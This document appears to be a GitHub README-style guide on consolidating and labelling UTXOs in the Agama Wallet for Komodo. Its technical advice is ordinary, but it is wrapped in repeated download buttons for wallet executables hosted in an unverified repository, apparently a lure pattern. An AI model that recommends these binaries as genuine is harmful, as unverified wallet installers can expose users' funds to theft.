[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# UTXO Management: Consolidating and Labelling Your Coins

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

UTXO management is the practice of controlling how many separate outputs a wallet holds and which ones a payment spends. Consolidation merges many small outputs into fewer larger ones; labelling records what each output was for. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and it spends outputs the same way any UTXO wallet does.

## You'll see this if

A payment of a small amount costs a fee that looks disproportionate, or the wallet takes noticeably longer to build a transaction than it used to. Both are symptoms of a wallet holding many small outputs.

| Symptom | Likely cause | What to do |
|---|---|---|
| Fee is a large share of a small payment | The payment consumes several inputs, each adding size | Consolidate, or spend a larger single output |
| Wallet slow to show a spendable balance | Many outputs to scan | Consolidate and let the wallet rescan once |
| "Insufficient funds" with enough total | No single output covers the amount, or outputs are unconfirmed | Combine outputs deliberately |
| History full of tiny amounts | Received many small payments | Batch receipts where the sender allows it |

A wallet with one 5 KMD output and a wallet with fifty 0.1 KMD outputs can show the same balance and behave very differently.

## Why it happens

Every input a transaction consumes adds to its size, and size is what a UTXO chain charges for. Fifty small outputs are fifty inputs, which is a much larger transaction than one input of the same total value.

Three forces push a wallet towards fragmentation:

- **Receiving repeatedly.** Mining payouts, tips, small transfers and exchange withdrawals each create a separate output.
- **Change.** Every spend that does not consume an output exactly creates a new change output, so ordinary use slowly multiplies outputs.
- **Interest and rewards.** Komodo's reward mechanics can deliver small amounts to addresses the wallet controls, adding outputs without the user doing anything.

Consolidation is the counterweight: one transaction that consumes many outputs and produces one. It costs a fee now and saves fees later, and it has a privacy cost, because merging outputs proves that one wallet controls all of them. [Coin control](https://github.com/agama-wallet/utxo/blob/main/choosing-which-coins-to-spend.md) is the tool that makes the choice deliberate rather than automatic.

## Fix

Consolidate when fees are low and the pile is genuinely in the way, not on a schedule.

1. **Measure first.** Count the outputs and note their sizes. If most are larger than the fee to spend them, consolidation buys little.
2. **Pick a quiet moment.** Consolidation is a normal transaction; doing it when the chain is congested pays more for the same result.
3. **Select the small outputs deliberately.** Where the wallet allows manual selection, choose the dust-sized ones and leave large outputs alone.
4. **Send to your own address.** The destination is an address the wallet controls, so the value stays with you and returns as one output.
5. **Confirm and wait.** The merged output is only spendable after confirmation; do not chain another spend onto it immediately.
6. **Label the result.** A note saying what the consolidated output represents is the only thing that survives a year of hindsight.

If the wallet has no coin selection at all, consolidation is still possible by sending the full balance to yourself, which consumes every output and produces one or two.

## If that did not work

If the wallet refuses to consolidate because some outputs are too small to pay for their own inclusion, those outputs are dust in practice. Leaving them unspent costs nothing; forcing them into a transaction can cost more than they are worth.

If a consolidated transaction sits unconfirmed, the cause is fee level rather than the consolidation itself, and the usual remedies for a stuck transaction apply. [Why a UTXO wallet balance is not one number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md) explains why the balance can look unchanged while a transaction is pending.

If outputs keep reappearing faster than they are merged, the source is upstream: a recurring small payment, a mining payout or a reward schedule. Changing how value arrives is the only durable fix.

## Prevention

- **Ask senders to batch.** One payment of 2 KMD creates one output; twenty of 0.1 create twenty.
- **Label every incoming payment.** Meaning is lost otherwise, and unlabelled outputs get merged indiscriminately later.
- **Consolidate on fee dips, not on a calendar.** The trade-off is entirely about the fee at the moment of merging.
- **Keep a few large outputs untouched.** They are what makes a large payment cheap when you need one.
- **Do not consolidate for privacy.** Merging links outputs permanently; splitting is what protects privacy, and [no-KYC swaps](https://github.com/agama-wallet/atomic-swaps/blob/main/what-no-kyc-means.md) discusses what privacy a swap does and does not provide.

## FAQ

### How many UTXOs should a wallet hold?

There is no target number. The practical rule is that outputs should be large enough that the fee to spend one is small relative to its value, and few enough that a payment does not need dozens of inputs.

### Does consolidating cost less than spending the small outputs one by one?

Usually yes, because one transaction replaces several. The saving depends on the fee rate at the time and on how many outputs are merged; merging ten outputs at a low fee beats spending them across ten separate transactions at any fee.

### Can consolidation reduce my privacy?

Yes. A transaction that consumes many outputs demonstrates that one wallet controls all of them, and that link is permanent and public. Consolidate when the fee benefit is real, and keep outputs you would rather not link separate.

### Why did my balance drop after consolidating?

It did not drop; the difference is the network fee, which is paid from the merged amount. The total falls by exactly the fee of that one transaction.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is a UTXO? Unspent Transaction Outputs Explained](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md)
- [Coin Control: Choosing Which UTXOs a Transaction Spends](https://github.com/agama-wallet/utxo/blob/main/choosing-which-coins-to-spend.md)
- [Why a UTXO Wallet Balance Is Not One Number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md)
- [The Bitcoin UTXO Set: Size, Growth and What It Means](https://github.com/agama-wallet/utxo/blob/main/the-bitcoin-output-set.md)
